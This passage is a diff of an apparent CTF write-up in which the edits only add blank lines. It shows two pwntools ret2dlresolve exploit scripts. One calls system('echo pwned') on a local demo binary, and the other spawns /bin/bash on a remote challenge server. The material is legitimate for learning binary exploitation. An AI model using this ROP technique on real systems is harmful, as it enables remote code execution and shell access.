@@ -90,13 +90,16 @@ b'pwned\n'
 After clearing some stuff and changing into a script format, we get:
 ```py
 from pwn import *
+
 context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+
 rop = ROP(context.binary)
 dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
 rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
 rop.ret2dlresolve(dlresolve)
 raw_rop = rop.chain()
 print(rop.dump())
+
 p = elf.process()
 p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
 p.recvline()
@@ -109,13 +112,16 @@ Now we execute the following:
 
 ```py
 from pwn import *
+
 context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+
 rop = ROP(context.binary)
 dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/bash"])
 rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
 rop.ret2dlresolve(dlresolve)
 raw_rop = rop.chain()
 print(rop.dump())
+
 p = remote('challenge1.lagncrash.com', 10001)
 p.sendline(fit({128+context.bytes*3: raw_rop, 300: dlresolve.payload}))
 p.recvline()
